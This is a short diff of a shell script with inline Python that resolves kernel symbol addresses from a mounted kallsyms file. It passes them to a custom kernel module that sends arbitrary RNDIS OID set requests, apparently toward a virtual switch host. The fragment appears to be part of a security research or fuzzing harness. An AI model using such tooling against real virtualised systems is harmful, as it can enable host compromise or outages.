@@ -7,12 +7,19 @@ own_mac=$(tr -d ':\n' </hostsys/class/net/eth0/address 2>/dev/null)
 printf 'RNDIS_SET_HOST sysfs_mac=%s\n' "$own_mac"
 PYTHONPATH=/tmp python3 - /tmp/rndis_oid_set.ko 0x01010102 '' <<'PY'
 import ctypes, os, sys
-from kcore_relid_load import symbol_address
 from rndis_legit_run import resolve_objects
 guid, relid, _nvdev, rndis, request_id = resolve_objects()
 oid = int(sys.argv[2], 0)
 data_hex = sys.argv[3]
-values = tuple(symbol_address(name) for name in
+def symbol_prefix(name):
+    hits=[]
+    for line in open('/hostproc/kallsyms'):
+        f=line.split()
+        if len(f)>=3 and f[1].lower()=='t' and f[2].startswith(name):
+            hits.append((f[2],int(f[0],16)))
+    if len(hits)!=1: raise RuntimeError('symbol %s hits=%r'%(name,hits))
+    return hits[0][1]
+values = tuple(symbol_prefix(name) for name in
                ("get_rndis_request", "rndis_filter_send_request", "put_rndis_request"))
 parameters = ("get_address=0x%x send_address=0x%x put_address=0x%x rndis_device=0x%x "
               "request_type=4 oid=0x%x input_length=%u arm=1" %
